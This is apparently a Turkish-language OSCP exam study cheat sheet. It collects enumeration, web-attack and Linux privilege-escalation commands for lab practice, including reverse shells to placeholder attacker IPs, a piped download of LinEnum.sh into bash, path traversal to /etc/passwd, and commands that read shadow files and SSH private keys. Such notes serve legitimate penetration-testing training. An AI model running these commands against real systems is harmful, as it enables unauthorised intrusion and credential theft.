---
attachments: [Clipboard_2021-08-07-14-36-36.png]
tags: [OSCP]
title: OSCP RoadMap
created: '2021-08-07T11:26:05.532Z'
modified: '2021-08-07T12:54:14.012Z'
---

# OSCP RoadMap

```|-- enumeration
|-- exploitation
	|-- exploits
		|-- ms08-067.c
|-- post_exploitation
	|-- file_transfer
	|-- gathering
		...
	|-- privilege_escalation
		|-- privchecker.py
  ```

OSCP sınavına hazır olmak için aşağıda ki konularda yetkinlik kazanmanız gerekiyor:

- Komut satırı 
- Buffer overflow 
- Kali Linux
- Güzel Not Tutma
- Python / Perl Betik dilleri
- Dosya Transferi
- Ayrıcalık Yükseltme
- Şifre Saldırıları
- Active Directory
- Bilgi Toplama Teknikleri (aktif-pasif)
- Kod Analiz Etme-Değiştirme-Düzenleme-Derleme

# Enumeration

|Enumeration | Method|
|----------- | ------|
|TCP/UDP | Nmap|  
|DNS | Dig|
|HTTP/S | Nmap, Brute Force|
|MS-SQL | Nmap|
|SSH | Hydra|
|SNMP | Onesixtyone|
|SMTP | Nmap-Scripts|
|SMB | Samrdump|
|FTP | Nmap, Hydra|

**Nikto** 

`nikto -host $targetip -port $targetport`

**Brute forcing HTTP(s) directories**

`./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $targetip -e php`

### SMB
  
   **Nmap**
   
   `locate *.nse | grep smb`
  
   `nmap -p 139,445 --script=$scriptname $targetip`

   **Enum4Linux**
   
   `enum4linux -a $targetip`

   **smbclient**

   `smbclient \\\\$ip\\$share`

### FTP

   **Control to access "Anonymous"**

   `ftp $targetip`
   `Username: anonymous`
   `Password: anything`

### SSH

   **SSH portu açıksa bunu unutmayın ve sistemde eğer kimlik bilgileri bulursanız bunu deneyin.**

### Netcat

   **Her zaman `netcat (nc)` ile bağlanabilir ve size hangi bilgileri sunacağını görebilirsiniz.**

### WEB

   İlk olarak bakmamız gereken;

   - Bilinen bir web uygulaması mı yoksa özel bir web uygulaması mı?
   - Adını `google` da aratın
   - Kaynak koduna bakın
   - Sürüm numaralarını ve `login` ekranını bulmaya çalışın
   - Bilinen bir web uygulaması ise `google` yada `searchspoilt` ile aramayı deneyin

   **Burpsuite**

   - Bir RCE yükü veya SQL enjeksiyonu hazırlıyorsanız, HTTP isteğini burp olarak tekrarlayıcıya göndermek ve yükü orada düzenlemek, tarayıcıda düzenlemeyi denemekten çok daha hızlı ve kolaydır. 
   - Hem OSCP hem de web alanında ki geleceğiniz için daha gelişmiş Burp özelliklerini de öğrenmeye çalışın!

   **Sqlmap**
   Güvenlik açığı bulunan isteği Burp gibi bir proxy kullanarak yakalayabilir, bir metin dosyasına kaydedebilir ve ardından SQLMap ile tarayabilirsiniz.

   `sqlmap -r dosyası.req`

   **LFI/RFI**

   Diyelim ki url de bulunan `/page` parametresi dosya ekleme güvenliğine karşı savunmasız;

   `http://target.com/?page=home`

   Eğer sistem Linux ise;

   `http://target.com/?page=./../../../../../../../../../etc/passwd%00`

   ile `/etc/passwd` içeriğini görebiliriz. (%00 ---> bunun amacı dizeyi sonlandırmaktır)

   **Command Injection**

   Hayal gücünüzü kullanarak kod parçacığının arka tarafta nasıl görünebileceğini ve kendi komutlarınızı nasıl enjekte edebileceğinizi düşünün!

   Eğer yürütebileceğiniz bir kod bulduysanız netcat'te ki `-e` parametresini kullanmadan shell alabilirsiniz;

   `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`


# Privileged Escalation

|Method | Hint|
|------ | ----|
|Basic system info | OS/Kernel/System name, etc|
|Networking Info | ifconfig, route, netstat, etc|
|Miscellaneous filesystem info | mount, fstab, cron jobs, etc|
|User info | current user, all users, super users, command history, etc|
|File and Directory permissions | world-writeable files/dirs, suid files, root home directory|
|Files containing | plaintext passwords| 
|Interesting files, processes and applications | all processes and packages, sudo version, apache config file, etc|
|All installed languages and tools | gcc, perl, python, nmap, netcat, wget, ftp, etc|
|All relevant privilege escalation exploits | using a comprehensive dictionary of exploits with applicable kernel versions, software packages/processes, etc|

**Windows açıklarını kendinize göre derleyerek arşivleyin.

  **Sudo**

    sudo su

    sudo  -l
  **Lineum**

    curl http://attackerip/LinEnum.sh | /bin/bash

### Version

     cat /etc/issue
     cat /etc/*-release
     cat /etc/lsb-release      # Debian based
     cat /etc/redhat-release   # Redhat based

### Kernel Version

    cat /proc/version
    uname -a
    uname -mrs
    rpm -q kernel
    dmesg | grep Linux
    ls /boot | grep vmlinuz-
    
### Çevresel Değişkenler

    cat /etc/profile
    cat /etc/bashrc
    cat ~/.bash_profile
    cat ~/.bashrc
    cat ~/.bash_logout
    env
    set


### Hangi Servisler Çalışıyor

    ps aux
    ps -ef
    top
    cat /etc/services
    ps aux | grep root    #root tarafından çalıştırılan servisler
    ps -ef | grep root    

### Hangi Uygulamalar İndirildi, Versiyonları Ne

    ls -alh /usr/bin/
    ls -alh /sbin/
    dpkg -l
    rpm -qa
    ls -alh /var/cache/apt/archivesO
    ls -alh /var/cache/yum/

### Yanlış Yapılandırma ve Savunması Eklentiler Var mı

    cat /etc/syslog.conf
    cat /etc/chttp.conf
    cat /etc/lighttpd.conf
    cat /etc/cups/cupsd.conf
    cat /etc/inetd.conf
    cat /etc/apache2/apache2.conf
    cat /etc/my.conf
    cat /etc/httpd/conf/httpd.conf
    cat /opt/lampp/etc/httpd.conf
    ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

### Zamanlanmış İşler Nedir

    crontab -l
    ls -alh /var/spool/cron
    ls -al /etc/ | grep cron
    ls -al /etc/cron*
    cat /etc/cron*
    cat /etc/at.allow
    cat /etc/at.deny
    cat /etc/cron.allow
    cat /etc/cron.deny
    cat /etc/crontab
    cat /etc/anacrontab
    cat /var/spool/cron/crontabs/root

### Herhangi Bir `Kullanıcıadı` yada `Şifre` Var mı

    grep -i user [filename]
    grep -i pass [filename]
    grep -C 5 "password" [filename]
    find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla

### Sistemde ki NIC ler ve Başka Bir Ağa Bağlı mı

    /sbin/ifconfig -a
    cat /etc/network/interfaces
    cat /etc/sysconfig/network 

### Ağ Hakkında, Yapılandırma Ayarları

    cat /etc/resolv.conf
    cat /etc/sysconfig/network
    cat /etc/networks
    iptables -L
    hostname
    dnsdomainname

### Başka Kullanıcılarla İletişim Var mı

    lsof -i
    lsof -i :80
    grep 80 /etc/services
    netstat -antup
    netstat -antpx
    netstat -tulpn
    chkconfig --list
    chkconfig --list | grep 3:on
    last
    w

### Ön Belleğe Alınan IP ve MAC Adresleri

    arp -e
    route
    /sbin/route -nee

### Canlı Trafik Dinleme 

    tcpdump tcp dst 192.168.1.7 80 and tcp dst $IPtarget

### Sistemde Bir Kabuk Alabiliyor muyuz

    nc -lvp 4444    # Attacker. Input (Commands)
    nc -lvp 4445    # Attacker. Ouput (Results)
    telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!

### Port Yönlendirme Mümkün mü

    FPipe.exe -l 80 -r 80 -s 80 $IP

    ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
    ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port

    mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
    mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
    mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)

### Tünelleme Yapmak Mümkün mü

    ssh -D 127.0.0.1:9050 -N [username]@[ip]
    proxychains ifconfig

### Gizli Bilgiler ve Kullanıcılar

    id
    who
    w
    last
    cat /etc/passwd | cut -d: -f1    # List of users
    grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
    awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
    cat /etc/sudoers
    sudo -l
### Bulunabilecek Hassas Dosyalar

    cat /etc/passwd
    cat /etc/group
    cat /etc/shadow
    ls -alh /var/mail/
### Ana Dizinlerde İlginç Birşey Var mı

    ls -ahlR /root/
    ls -ahlR /home/
  
### Herhangi Bir Şifre Var mı

    cat /var/apache2/config.inc
    cat /var/lib/mysql/mysql/user.MYD
    cat /root/anaconda-ks.cfg

### Kullanıcı Ne Yapıyor? Düz Metinde Herhangi Bir Şifre Var mı

    cat ~/.bash_history
    cat ~/.nano_history
    cat ~/.atftp_history
    cat ~/.mysql_history
    cat ~/.php_history

### SSH Bilgileri Var mı

    cat ~/.ssh/authorized_keys
    cat ~/.ssh/identity.pub
    cat ~/.ssh/identity
    cat ~/.ssh/id_rsa.pub
    cat ~/.ssh/id_rsa
    cat ~/.ssh/id_dsa.pub
    cat ~/.ssh/id_dsa
    cat /etc/ssh/ssh_config
    cat /etc/ssh/sshd_config
    cat /etc/ssh/ssh_host_dsa_key.pub
    cat /etc/ssh/ssh_host_dsa_key
    cat /etc/ssh/ssh_host_rsa_key.pub
    cat /etc/ssh/ssh_host_rsa_key
    cat /etc/ssh/ssh_host_key.pub
    cat /etc/ssh/ssh_host_key


### /etc Dizinine Hangi Dosyalar Yazılabilir

    ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
    ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
    ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
    ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other

    find /etc/ -readable -type f 2>/dev/null               # Anyone
    find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone

### /var İçinde Neler Bulunabilir

    ls -alh /var/log
    ls -alh /var/mail
    ls -alh /var/spool
    ls -alh /var/spool/lpd
    ls -alh /var/lib/pgsql
    ls -alh /var/lib/mysql
    cat /var/lib/dhcp3/dhclient.leases

### Veritabanı Bilgilerini İçeren Bir Ayar Dosyası Var mı

    ls -alhR /var/www/
    ls -alhR /srv/www/htdocs/
    ls -alhR /usr/local/www/apache22/data/
    ls -alhR /opt/lampp/htdocs/
    ls -alhR /var/www/html/
    
### SUID-GUID 

    find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
    find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
    find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

    find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
    for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

    find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

### Yazma ve Çalıştırma İçin Ortak Dizinler

    find / -writable -type d 2>/dev/null      # world-writeable folders
    find / -perm -222 -type d 2>/dev/null     # world-writeable folders
    find / -perm -o w -type d 2>/dev/null     # world-writeable folders

    find / -perm -o x -type d 2>/dev/null     # world-executable folders

    find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

### Hangi Geliştirme Dilleri Destekleniyor

    find / -name perl*
    find / -name python*
    find / -name gcc*
    find / -name cc

### Dosyalar Nasıl Yüklenebilir

    find / -name wget
    find / -name nc*
    find / -name netcat*
    find / -name tftp*
    find / -name ftp











